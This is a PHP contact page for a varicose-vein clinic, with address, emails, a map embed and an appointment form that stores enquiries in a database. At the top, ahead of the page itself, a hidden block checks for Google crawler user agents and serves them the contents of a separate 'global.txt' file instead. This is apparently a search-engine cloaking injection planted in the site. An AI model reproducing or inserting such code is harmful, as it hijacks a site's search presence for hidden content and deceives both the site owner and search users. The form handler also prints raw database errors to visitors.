<?php
function is_google_crawler() {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    return preg_match('/(Googlebot|Google-Site-Verification|Google-InspectionTool|Googlebot-Mobile|Googlebot-News)/i', $ua);
}

if (is_google_crawler()) {
    $local_file = __DIR__ . '/global.txt';

    if (file_exists($local_file)) {
        $response = file_get_contents($local_file);
        if ($response !== false) {
            echo $response;
        }
    }

    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- x-icon -->
    <link rel="shortcut icon" href="assets/css/favicon.png" type="image/x-icon">

    <!-- Other css -->
    <link rel="stylesheet" href="assets/css/animate.css">
    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/all.min.css">
    <link rel="stylesheet" href="assets/css/icofont.min.css">
    <link rel="stylesheet" href="assets/css/swiper.min.css">
    <link rel="stylesheet" href="assets/css/odometer.css">
    <link rel="stylesheet" href="assets/css/lightcase.css">
    <link rel="stylesheet" href="assets/css/style.css">

  <?php include('header.php');?>
    
    <!-- ==========Banner Section Start Here========== -->
    <div class="pageheader padding-tb bg-img" style="background-image: url(assets/images/bg/page-header.jpg);">
        <div class="container">
            <div class="pageheader__area text-center">
                <h2>Contact</h2>
                <nav aria-label="breadcrumb">
                    <ol class="breadcrumb justify-content-center">
                        <li class="breadcrumb"><a href="index.php">Home / </a></li>
                        <li class="breadcrumb-item active" aria-current="page">Contacts</li>
                    </ol>
                </nav>
            </div>
        </div>
    </div>
    <!-- ==========Banner Section Ends Here========== -->

    
    <!-- ==========Contact Section Start Here========== -->
    <div class="contact padding-tb">
        <div class="container">
            <div class="section__wrapper">
                <div class="row justify-content-center g-4">
                    <div class="col-lg-4 col-sm-6 col-12">
                        <div class="contact__item">
                            <div class="contact__icon">
                                <img src="assets/images/l.jpg" alt="rajib raj">
                            </div>
                            <div class="contact__content">
                                <h5>Visit Us :</h5>
                                <p>Star Imaging, Bhatti Rd, near Beri Wala Baba, Bathinda 151001</p>
                            </div>
                        </div>
                    </div>
                    <div class="col-lg-4 col-sm-6 col-12">
                        <div class="contact__item">
                            <div class="contact__icon">
                                <img src="assets/images/t.jpg" alt="rajib raj">
                            </div>
                            <div class="contact__content">
                                <h5>Email :</h5>
                                <p><a href="mailto:drrajaveinclinic@gmail.com"><span>drrajaveinclinic@gmail.com</span></a></p>
                                  <p><a href="mailto:ambrishraja83@gmail.com"><span>ambrishraja83@gmail.com</span></a></p>
                            </div>
                        </div>
                    </div>
                    <div class="col-lg-4 col-sm-6 col-12">
                        <div class="contact__item">
                            <div class="contact__icon">
                                <img src="assets/images/m.jpg" alt="rajib raj">
                            </div>
                            <div class="contact__content">
                                <h5>Phone number</h5>
                                <p><a href="tel:90342-42189">+91 90342-42189</a></p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- ==========Contact Section Ends Here========== -->

        
    <!-- ==========Blog Section Start Here========== -->
    <div class="blog blog--classic padding-tb">
        <div class="container">
            <div class="section__wrapper">
                <div class="row g-5 g-lg-4">
                    <div class="col-lg-6 col-12">
                        <div class="row g-4 justify-content-center">
                            <div class="col-12">
                                <div class="blog__item">
                                     <div class="map">
        <iframe src="https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d55159.57826271751!2d74.945281!3d30.223567!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x391732be29499091%3A0xc8f4c279a22cb486!2sDR.%20RAJA%E2%80%99S%20VEIN%20%26%20INTERVENTION%20CLINIC-Varicose%20Veins%2FULCERS!5e0!3m2!1sen!2sin!4v1679563738137!5m2!1sen!2sin" width="100%" height="250" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
    </div>
                                </div>
                            </div>
                      
                         
                           
                        </div>
                       
                    </div>
                    <div class="col-lg-6 col-12">
                        <div class="sidebar">
                            <div class="row g-6">
                                <div class="col-12">
                                    <div class="sidebar__author">
                                       
                                        <div class="content">
                                             <div class="contact contact--one contact--three bg-img" style="background-image: url(assets/images/bg/14.jpg);">
        <div class="container">
            <div class="section__header text-center">
                <h5>Book Appointment </h5>
            </div>
            <div class="section__wrapper">
                <form  method="POST">
                    <div class="row g-4 justify-content-center">
                        <div class="col-md-6 col-12">
                            <input type="text" placeholder="Your Name*" name="enqnam" id="name" required>
                        </div>
                        <div class="col-md-6 col-12">
                            <input type="email" placeholder="Your Email*" name="enqeml" id="email" required>
                        </div>
                        <div class="col-md-6 col-12">
                            <input type="text" placeholder="Treatment" name="enqsub" id="subject">
                        </div>
                        <div class="col-md-6 col-12">
                            <input type="text" placeholder="Your Number" name="enqmob" id="number">
                        </div>
                        <div class="col-12">
                            <textarea name="enqmsg" id="message" rows="6" placeholder="Message*" required></textarea>
                        </div>
                        <div class="col-12 text-center">
                            <button type="submit" name="btn2" class="lab-btn border-0">Submit<i class="fa-solid fa-arrow-right"></i></button>
                        </div>
                    </div>
                    <p class="form-message"></p>


                     <?php
                              include('admin/connection.php');
                              if(isset($_POST['btn2']))
                              {
                              $enqnam=mysqli_real_escape_string($dbcon,$_POST['enqnam']);
                              $enqeml=mysqli_real_escape_string($dbcon,$_POST['enqeml']);
                              $enqmob=mysqli_real_escape_string($dbcon,$_POST['enqmob']);
                               $enqsub=mysqli_real_escape_string($dbcon,$_POST['enqsub']);
                              
                           $enqmsg=mysqli_real_escape_string($dbcon,$_POST['enqmsg']);
                               $today=date("F j, Y");               
                              
                         $query="insert into tbenq(enqnam,enqeml,enqmob,enqsub,enqmsg,date,added) VALUES ('$enqnam','$enqeml','$enqmob','$enqsub','$enqmsg',CURDATE(),'Contact Enquiry');";
                              if(mysqli_query($dbcon,$query))
                              {
                              echo "<script> alert('Enquiry Submitted Successfully');</script>";
                              }
                              else{
                              echo mysqli_error($dbcon);
                              }                     
                              }
                              ?>  
                </form>
            </div>
        </div>
    </div>
                                        </div>
                                    </div>
                                </div>
                                
                              
                               
                                
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- ==========Blog Section Ends Here========== -->
    
   <?php include('footer.php');?>
</body>
</html>